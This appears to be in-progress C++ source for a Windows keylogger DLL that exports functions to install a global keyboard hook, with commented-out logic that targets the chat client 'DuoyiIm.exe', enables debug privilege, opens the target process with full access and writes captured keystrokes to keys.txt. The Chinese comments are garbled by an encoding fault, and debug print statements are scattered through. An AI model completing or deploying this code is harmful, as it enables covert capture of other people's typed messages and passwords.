#define _WIN32_WINNT 0x0500

#include<fstream>
#include<windows.h>
#include<stdio.h>
#include <tchar.h>
#include <assert.h>
#include<string>
#include<algorithm>
#include<iostream>
#include <tlhelp32.h>  
using namespace std;

#define DEF_PROCESS_NAME "DuoyiIm.exe"
 
ofstream out("keys.txt", ios::out);

HINSTANCE g_hInstance = NULL;
HHOOK keyboardHook = NULL;
HWND g_hWnd;

// ö��ϵͳ��ǰ���н�����Ϣ  
// ������Ϣ���������Ŀ¼��EnumInfo_ToolHelp_process.txt  
BOOL EnumProcessInfo(DWORD processId)  
{  
	
    // ���������Ϣ�ṹ  
    PROCESSENTRY32 pe32 = {sizeof(pe32)} ;  
  
    // ����ϵͳ��ǰ���̿���  
    HANDLE hProcessShot = CreateToolhelp32Snapshot ( TH32CS_SNAPPROCESS, 0 ) ;  
    if ( hProcessShot == INVALID_HANDLE_VALUE )  
        return FALSE ;  
  
    // ���������Ϣ���ļ�  
    //ofstream fout ( "EnumInfo_ToolHelp_process.txt" ) ;  
  
    // ѭ��ö�ٽ�����Ϣ  
    char szBuf[1024] = {0} ;  
    if ( Process32First ( hProcessShot, &pe32 ) )  
    {  
        do {  
            memset ( szBuf, 0, sizeof(szBuf) ) ;  
			/*
            // �ѿ��ַ��Ľ�����ת��ΪANSI�ַ���  
            WideCharToMultiByte (CP_ACP, 0, pe32.szExeFile, wcslen(pe32.szExeFile), szBuf, sizeof(szBuf), NULL, NULL );  
              */
			//printf("wwww\n");
			/*
            cout << "Process: " << pe32.szExeFile << endl ;  
			
            cout << '\t' << "Usage           : " << pe32.cntUsage << endl ;  
            cout << '\t' << "ProcessID       : " << pe32.th32ProcessID << endl ;  
            cout << '\t' << "DefaultHeapID   : " << pe32.th32DefaultHeapID << endl ;  
            cout << '\t' << "ModuleID        : " << pe32.th32ModuleID << endl ;  
            cout << '\t' << "ThreadNum       : " << pe32.cntThreads   << endl ;  
            cout << '\t' << "ParentProcessID : " << pe32.th32ParentProcessID << endl ;  
            cout << '\t' << "PriClassBase    : " << pe32.pcPriClassBase << endl ;  
			*/
			if(processId == pe32.th32ProcessID) {
				//cout << "yes!!" << pe32.szExeFile << endl;
				break;
			}
        }while ( Process32Next ( hProcessShot, &pe32 ) ) ;  
    }  
	
    //fout.close () ;  
    CloseHandle ( hProcessShot ) ;  
	
	if(strcmp(pe32.szExeFile, DEF_PROCESS_NAME) == 0)
		return true;
	else return false;
}  

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {//ncode<0���뷵�ء�wparam������Ϣ��lparam
	cout << "123123" <<wParam << endl;
	//printf("tata\n");
	//out <<"wawa\n";
	//char szPath[MAX_PATH] = {0,};
	//char *p = NULL;
	/*
	if(nCode >= 0) {
		if(!(lParam & 0x80000000)) {

			/*
			HWND wnd;//���ھ��
			wnd=GetForegroundWindow();//��õ�ǰ����Ĵ��ھ��
			DWORD SelfThreadId=GetCurrentThreadId();//��ȡ������߳�ID
			DWORD ForeThreadId=GetWindowThreadProcessId(wnd,NULL);//���ݴ��ھ����ȡ�߳�ID
			AttachThreadInput(ForeThreadId,SelfThreadId,true);//�����߳�
			wnd=GetFocus();//��ȡ�������뽹��Ĵ��ھ��
			AttachThreadInput(ForeThreadId,SelfThreadId,false);//ȡ�����ӵ��߳�
			SendMessage(wnd,WM_CHAR,WPARAM('z'),0);//����һ������Ϣ
			*/
/*
			HWND hWnd = GetForegroundWindow();
			DWORD processId = 0;
			GetWindowThreadProcessId(hWnd, &processId);
			
*/
			
			/*
			HANDLE hToken;
			// ��һ�����̵ķ�������
			if (::OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
			{
			// ȡ����Ȩ����λ"SetDebugPrivilege"��LUID
			LUID uID;
			::LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &uID);
			// ������Ȩ����
			TOKEN_PRIVILEGES tp;
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = uID;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			::AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
			// �رշ������ƾ��
			::CloseHandle(hToken);
			}
			HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
			//ASSERT(hProcess != NULL);
			*/


			//hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, dwPID);  
			//GetModuleFileNameA((HINSTANCE)processId, szPath, MAX_PATH);
			//GetProcessImageFileName(hProcess,szPath,MAX_PATH);
			//bool flag = EnumProcessInfo(processId);
			//cout<<"ppppppppidddddd"<<processId<<endl;
			//cout << "flag" << flag << endl;
			/*
			bool flag = true;
			if(flag) {
				PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
      
				// If key is being pressed
				if (wParam == WM_KEYDOWN) {
					printf("%c\n",char(tolower(p->vkCode)));
					switch (p->vkCode) {
			
						// Invisible keys
						case VK_CAPITAL:    out << "<CAPLOCK>";     break;
						case VK_SHIFT:      out << "<SHIFT>";       break;
						case VK_LCONTROL:   out << "<LCTRL>";       break;
						case VK_RCONTROL:   out << "<RCTRL>";       break;
						case VK_INSERT:     out << "<INSERT>";      break;
						case VK_END:        out << "<END>";         break;
						case VK_PRINT:      out << "<PRINT>";       break;
						case VK_DELETE:     out << "<DEL>";         break;
						case VK_BACK:       out << "<BK>";          break;
 
						case VK_LEFT:       out << "<LEFT>";        break;
						case VK_RIGHT:      out << "<RIGHT>";       break;
						case VK_UP:         out << "<UP>";          break;
						case VK_DOWN:       out << "<DOWN>";        break;
 
						// Visible keys
						default:
							out << char(tolower(p->vkCode));
					}
				}
			}
		}
	}
	*/
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

//BOOL WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved) {
	printf("1111aaaaaa\n");
	g_hInstance = hInstance;
	switch(dwReason) {
		case DLL_PROCESS_ATTACH:
			g_hInstance = hInstance;
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
    // Set windows hook
	/*
    HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboardHookProc,
        hInstance,
        0);
	
    MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);
 
    out.close();
	*/
 
    return true;
}

extern "C" _declspec(dllexport) void HookStart()
{
	keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD,
        keyboardHookProc,
        g_hInstance,
        0);
	//MessageBox(NULL, "��ȷ��������hook", "Information", MB_OK);
	//printf("bbbbb\n");
}

extern "C" _declspec(dllexport) void HookStop()
{
	UnhookWindowsHookEx(keyboardHook);
	out.close();
	printf("hook�ѽ���!!!\n");
}
